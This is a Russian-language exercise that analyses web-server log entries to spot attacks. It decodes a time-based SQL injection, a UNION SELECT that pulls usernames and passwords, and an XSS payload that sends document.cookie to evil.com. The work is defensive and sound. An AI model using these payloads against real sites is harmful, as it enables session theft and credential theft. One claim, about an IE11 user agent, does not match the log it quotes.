# Практический разбор логов веб сервера
### Лог 1
```
192.168.1.10 - - [15/Mar/2024:14:23:45 +0300] "GET /index.php?id=1%20AND%20sleep(5) HTTP/1.1" 200 5432 "-" "Mozilla/5.0"
```
#### Ответ:

В этом логе в целом на первый взгляд нет ничего особенного, единственное, что бросается в глаза - **sleep(5)** в конце адреса
Если внимательно изучить эту чать /index.php?id=1%20AND%20sleep(5), то увидим попытку атаки Sql - инъекция времени с запросом AND sleep(5).

* %20 - это пробел в URL-кодировке

Похоже злоумышленник пытается проверить, можно ли заставить базу данных уснуть на 5 секунд. Так как код ответа 200, ему это удалось и скорее всего уязвимость есть. 

После этого он может приступить к атаке с помощью классической SQLI для доступа к базе данных.

### Лог 4
```
45.132.44.87 - - [17/Mar/2026:14:25:33] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 45
(еще 157 таких же запросов за 5 минут)
```
#### Ответ:

Это брут форс атака. Цель —  файл admin-ajax.php.
Это типичная техника атаки на WordPress: злоумышленник отправляет запросы к AJAX-обработчику, пытаясь подобрать параметры или выполнить вредоносный код.
158 запросов за 5 минут (~31 запрос/мин) — медленный брутфорс, чтобы не заблокироваться фаерволом.

Также User-Agent устаревший (Internet Explorer 11 — им уже почти никто не пользуется

### Лог 5
```
203.0.113.45 - - [17/Mar/2026:14:30:22 +0300] "GET /product?id=1%20AND%201=1%20UNION%20SELECT%20username,password%20FROM%20users%20--%20HTTP/1.1" 500 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0"
```
#### Ответ:

Если декодировать параметр юрл, то выйдет: 1 AND 1=1 UNION SELECT username,password FROM users --

Это классическая SQL-инъекция типа UNION для извлечения учетных данных из БД.

Код 500 (Internal Server Error) — сервер упал в ошибку. Это хороший знак для атакующего: значит, его запрос что-то "сломал" в SQL-запросе.
Часто ошибка 500 при SQLi означает, что сервер уязвим, но синтаксис атаки требует уточнения.


### Лог 6
```
10.10.10.100 - - [17/Mar/2026:14:35:47 +0300] "POST /login HTTP/1.1" 302 0 "https://internal.example.com/login" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
10.10.10.100 - - [17/Mar/2026:14:35:49 +0300] "GET /dashboard HTTP/1.1" 200 15234 "https://internal.example.com/login" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
10.10.10.100 - - [17/Mar/2026:14:35:52 +0300] "GET /settings HTTP/1.1" 200 3421 "https://internal.example.com/dashboard" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
```
#### Ответ:

Это нормальная пользовательская сессия после успешного входа:

POST /login → 302 Redirect — сервер перенаправляет пользователя после успешного входа

GET /dashboard → 200 OK — пользователь заходит в личный кабинет

GET /settings → 200 OK — переходит в настройки

### Лог 7
```
89.208.246.120 - - [17/Mar/2026:14:40:11 +0300] "GET /search?q=%3Cimg%20src%3Dx%20onerror%3D%27fetch(%22http%3A%2F%2Fevil.com%2Fsteal%3Fcookie%3D%22%2Bdocument.cookie)%27%3E HTTP/1.1" 200 1250 "https://example.com/search" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15"
```
#### Ответ:

Декодируем URL (%3C = <, %20 = пробел, %27 = '): 
```
<img src=x onerror='fetch("http://evil.com/steal?cookie="+document.cookie)'>
```
Это XSS (межсайтовый скриптинг) с кражей кук (cookie stealing).

Как это работает:

1. Злоумышленник отправляет жертве ссылку с этим кодом.
2. При загрузке страницы браузер пытается показать картинку src=x (которой нет).
3. Срабатывает событие onerror и выполняется JavaScript: fetch(...)
4. Скрипт отправляет document.cookie (сессионные куки пользователя) на сервер evil.com.
